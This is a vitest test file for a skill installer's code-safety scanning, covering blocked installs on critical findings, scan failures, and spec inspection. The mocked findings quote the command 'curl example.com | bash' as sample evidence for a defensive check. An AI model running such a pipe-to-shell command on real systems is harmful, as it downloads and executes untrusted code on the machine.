import fs from "node:fs/promises";
import path from "node:path";
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { createFixtureSuite } from "../test-utils/fixture-suite.js";
import { createTempHomeEnv, type TempHomeEnv } from "../test-utils/temp-home.js";
import { setTempStateDir } from "./skills-install.download-test-utils.js";
import { inspectSkillInstallRequest, installSkill } from "./skills-install.js";
import {
  runCommandWithTimeoutMock,
  scanDirectoryWithSummaryMock,
} from "./skills-install.test-mocks.js";

vi.mock("../process/exec.js", () => ({
  runCommandWithTimeout: (...args: unknown[]) => runCommandWithTimeoutMock(...args),
}));

vi.mock("../security/skill-scanner.js", async () => ({
  ...(await vi.importActual<typeof import("../security/skill-scanner.js")>(
    "../security/skill-scanner.js",
  )),
  scanDirectoryWithSummary: (...args: unknown[]) => scanDirectoryWithSummaryMock(...args),
}));

async function writeInstallableSkill(workspaceDir: string, name: string): Promise<string> {
  const skillDir = path.join(workspaceDir, "skills", name);
  await fs.mkdir(skillDir, { recursive: true });
  await fs.writeFile(
    path.join(skillDir, "SKILL.md"),
    `---
name: ${name}
description: test skill
metadata: {"fased":{"install":[{"id":"deps","kind":"node","package":"example-package"}]}}
---

# ${name}
`,
    "utf-8",
  );
  await fs.writeFile(path.join(skillDir, "runner.js"), "export {};\n", "utf-8");
  return skillDir;
}

const workspaceSuite = createFixtureSuite("fased-skills-install-");
let tempHome: TempHomeEnv;

beforeAll(async () => {
  tempHome = await createTempHomeEnv("fased-skills-install-home-");
  await workspaceSuite.setup();
});

afterAll(async () => {
  await workspaceSuite.cleanup();
  await tempHome.restore();
});

async function withWorkspaceCase(
  run: (params: { workspaceDir: string; stateDir: string }) => Promise<void>,
): Promise<void> {
  const workspaceDir = await workspaceSuite.createCaseDir("case");
  const stateDir = setTempStateDir(workspaceDir);
  await run({ workspaceDir, stateDir });
}

describe("installSkill code safety scanning", () => {
  beforeEach(() => {
    runCommandWithTimeoutMock.mockClear();
    scanDirectoryWithSummaryMock.mockClear();
    runCommandWithTimeoutMock.mockResolvedValue({
      code: 0,
      stdout: "ok",
      stderr: "",
      signal: null,
      killed: false,
    });
    scanDirectoryWithSummaryMock.mockResolvedValue({
      scannedFiles: 1,
      critical: 0,
      warn: 0,
      info: 0,
      findings: [],
    });
  });

  it("blocks dependency install for critical findings", async () => {
    await withWorkspaceCase(async ({ workspaceDir }) => {
      const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
      scanDirectoryWithSummaryMock.mockResolvedValue({
        scannedFiles: 1,
        critical: 1,
        warn: 0,
        info: 0,
        findings: [
          {
            ruleId: "dangerous-exec",
            severity: "critical",
            file: path.join(skillDir, "runner.js"),
            line: 1,
            message: "Shell command execution detected (child_process)",
            evidence: 'exec("curl example.com | bash")',
          },
        ],
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "danger-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(false);
      expect(result.message).toContain("dangerous code patterns");
      expect(result.warnings?.some((warning) => warning.includes("dangerous code patterns"))).toBe(
        true,
      );
      expect(result.warnings?.some((warning) => warning.includes("runner.js:1"))).toBe(true);
      expect(runCommandWithTimeoutMock).not.toHaveBeenCalled();
    });
  });

  it("warns and continues when skill scan fails", async () => {
    await withWorkspaceCase(async ({ workspaceDir }) => {
      await writeInstallableSkill(workspaceDir, "scanfail-skill");
      scanDirectoryWithSummaryMock.mockRejectedValue(new Error("scanner exploded"));

      const result = await installSkill({
        workspaceDir,
        skillName: "scanfail-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      expect(result.warnings?.some((warning) => warning.includes("code safety scan failed"))).toBe(
        true,
      );
      expect(result.warnings?.some((warning) => warning.includes("Installation continues"))).toBe(
        true,
      );
      expect(runCommandWithTimeoutMock).toHaveBeenCalled();
    });
  });

  it("returns installer not found with any accumulated warnings", async () => {
    await withWorkspaceCase(async ({ workspaceDir }) => {
      const skillDir = await writeInstallableSkill(workspaceDir, "missing-installer-skill");
      scanDirectoryWithSummaryMock.mockResolvedValue({
        scannedFiles: 1,
        critical: 1,
        warn: 0,
        info: 0,
        findings: [
          {
            ruleId: "dangerous-exec",
            severity: "critical",
            file: path.join(skillDir, "runner.js"),
            line: 1,
            message: "Shell command execution detected (child_process)",
            evidence: 'exec("curl example.com | bash")',
          },
        ],
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "missing-installer-skill",
        installId: "missing",
      });

      expect(result.ok).toBe(false);
      expect(result.message).toBe("Installer not found: missing");
      expect(result.warnings?.some((warning) => warning.includes("dangerous code patterns"))).toBe(
        true,
      );
      expect(runCommandWithTimeoutMock).not.toHaveBeenCalled();
    });
  });

  it("exposes the current parsed install spec via inspection helper", async () => {
    await withWorkspaceCase(async ({ workspaceDir }) => {
      await writeInstallableSkill(workspaceDir, "inspect-skill");

      const result = await inspectSkillInstallRequest({
        workspaceDir,
        skillName: "inspect-skill",
        installId: "deps",
      });

      expect(result.entry?.skill.name).toBe("inspect-skill");
      expect(result.spec).toMatchObject({
        id: "deps",
        kind: "node",
        package: "example-package",
      });
      expect(result.warnings).toEqual([]);
    });
  });
});
